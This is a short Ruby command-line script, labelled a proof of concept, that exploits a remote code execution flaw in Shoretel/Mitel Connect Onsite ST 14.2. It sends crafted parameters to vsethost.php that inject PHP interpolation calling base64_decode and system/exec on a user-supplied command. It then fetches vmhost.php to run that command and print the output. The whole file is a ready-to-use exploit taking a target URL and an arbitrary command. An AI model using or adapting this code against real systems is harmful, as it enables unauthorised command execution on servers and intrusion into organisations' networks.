#!/usr/bin/env ruby

require "base64"
require "methadone"
require "faraday"

include Methadone::Main
include Methadone::CLILogging

main do |base_url,command|

  cmd_b64 = Base64.strict_encode64(command.strip)

  conn = Faraday.new(:url => base_url.strip)
  res = conn.get do |req|
    req.url "/scripts/vsethost.php", 
      {
        :hostId => "system",
        :keyCode => "base64_decode",
        :meetingType => "{${gKeyCode}($gSessionDir)}",
        :sessionDir => cmd_b64,
        :swfServer => "{${gHostID}($gMeetingType)}",
        :server => "exec",
        :dir => "/usr/share/apache2/htdocs/wc2_deploy/scripts/"
      }
  end

  rce = conn.get do |req|
    req.url "/scripts/vmhost.php"
  end

  print rce.body.to_s
end

version       "0.1.0"
description   "Shoretel/Mitel Connect Onsite ST 14.2 Remote Code Execution PoC"

arg :base_url, "URL of vulnerable Connect Onsite ST 14.2 Installation."
arg :command, "Command to run."

go!

